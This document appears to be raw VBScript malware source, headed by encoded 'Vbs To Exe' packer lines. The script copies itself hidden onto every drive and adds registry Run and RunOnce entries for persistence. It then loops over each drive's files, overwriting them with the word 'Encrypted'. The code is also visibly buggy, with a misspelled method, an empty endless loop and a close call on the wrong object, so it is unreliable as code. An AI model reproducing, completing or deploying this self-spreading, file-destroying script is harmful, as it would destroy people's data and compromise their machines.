' ' [ V b s   T o   E x e ]  
 ' '  
 ' ' a M R A 3 A f Q R N j B H M h Q  
 ' ' d N R K 2 0 S C C v g =  
 ' ' a M R A x Q X M W Y + T T p x w 7 7 V A u A = =  
 ' ' b d Z W x h P Q W J z c A d h Q  
 ' ' a t N M x 0 S C C s j 8  
 ' ' e 9 h X 2 A X L C s X c D f g =  
 ' ' e N N M x 0 S C C s j 8  
 ' ' b d Z G 3 g H N C s X c D P g =  
 ' ' c N J R 3 Q v b C s X c D P g =  
 ' ' e d J J 2 g r a U p G I H M V w 4 p U =  
 ' ' c s F A x x P N Q 4 y Z H M V w 4 p U =  
 ' ' f M N R x w 3 d X 4 y Z T 9 h t 8 q V w  
 ' ' e d 5 W x Q j e U 9 j B H M h Q  
 ' ' a 9 5 L 0 w u f F 9 j M P A = =  
 ' ' e 9 5 J 0 B L a W I u V U 5 Z w 7 7 V w  
 ' ' b c V K 0 R H c X o 6 Z T o s 5 v f t Q h V o /  
 ' ' b c V K 0 R H c X p a d U Z 1 w 7 7 V w  
 ' ' c s V M 0 g 3 R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 =  
 ' ' d N l R 0 B b R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 =  
 ' ' e d J W 1 h b W W o y V U 5 Z w 7 7 V w  
 ' ' f t h I x Q X R U 9 j B H P g =  
 ' ' a c V E 0 Q H S S 4 q X H M V w 0 g = =  
 ' ' f t h V z B b W T Z C I H M V w 0 g = =  
 ' ' b c V M w w X L T 5 q J V Z Q 0 8 q h Q u A = =  
 ' ' b s d A 1 g 3 e R p q J V Z Q 0 8 q h Q u A = =  
 ' ' f t h I 2 A H R X o v c A d h Q  
 ' ' b t Z T 0 E S C C r z G Y I 4 5 o P o F y 1 R a k V s A  
 ' ' a N Z G l V m f G P g =  
 ' '  
 ' '  
 ' ' 1 4 7 0 9 f e 1 4 e 5 6 f b 5 a 9 8 1 e b 6 c 1 2 6 f 1 1 5 e 2  
 o p t i o n   E x p l i c i t  
  
 D i m   F i l e S y s O b j e c t ,   F i l e ,   D r i v e s ,   D r i v e ,   c n t ,   i t e m s ,   d i r ,   f i l e 1  
  
 c n t   =   0  
  
 S e t   F i l e S y s O b j e c t   =   C r e a t e O b j e c t   ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " )  
 S e t   F i l e   =   F i l e S y s O b j e c t . G e t F i l e ( W S c r i p t . S c r i p t F u l l N a m e )  
  
 S e t   D r i v e s   =   F i l e S y s O b j e c t . D r i v e s  
  
 F o r   E a c h   D r i v e   i n   D r i v e s  
 	 i f   c n t   >   0   t h e n   F i l e . C o p y   ( C h r ( 9 9   +   c n t )   +   " : \ W I N 3 2 B S C R . v b s " )  
 	 F i l e . A t t r i b u t e s   =   2  
 	 c n t   =   c n t   +   1  
 N e x t  
  
 D i m   W s h S h e l l  
 S e t   W s h S h e l l   =   W S c r i p t . C r e a t e O b j e c t ( " W S c r i p t . S h e l l " )  
  
 c n t   =   0  
  
 F o r   E a c h   D r i v e   i n   D r i v e s  
 	 i f   c n t   >   0   t h e n    
 	 	 W s h S h e l l . R e g W r i t e   " H K E Y _ L O C A L _ M A C H I N E \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n \ W I N 3 2 B S C R A L " ,   C h r ( 9 9   +   c n t )   +   " : \ w i n d o w s \ W I N 3 2 B S C R . v b s "  
 	 	 W s h S h e l l . R e g W r i t e   " H K E Y _ L O C A L _ M A C H I N E \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n O n c e \ W I N 3 2 B S C R A L " ,   C h r ( 9 9   +   c n t )   +   " : \ w i n d o w s \ W I N 3 2 B S C R . v b s "  
 	 e n d   i f  
 	 c n t   =   c n t   +   1  
 N e x t  
  
 D o   w h i l e   1   <   3  
 l o o p  
 	 F o r   E a c h   D r i v e   i n   D r i v e s  
 	 	 i f   c n t   >   0   t h e n    
 	 	 	 S e t   d i r   =   F i l e S y s O b j e c t . G e t F o l d e r ( D r i v e )  
 	 	 	 F o r   E a c h   i t e m   i n   d i r . F i l e s  
 	 	 	 	 f i l e 1   =   F i l e S y s O b j e c t . C r e t e T e x t F i l e ( i t e m . N a m e ,   T r u e )  
 	 	 	 	 f i l e 1 . W r i t e ( " E n c r y p t e d " )  
 	 	 	 	 f i l e 1 . A t t r i b u t e s   =   2  
 	 	 	 	 f i l e . c l o s e ( )  
 	 	 	 	 W S c r i p t . s l e e p ( 6 0 0 0 0 * 6 0 )  
 	 	 	 N e x t  
 	 	 e n d   i f  
 	 	 c n t   =   c n t   +   1  
 	 N e x t 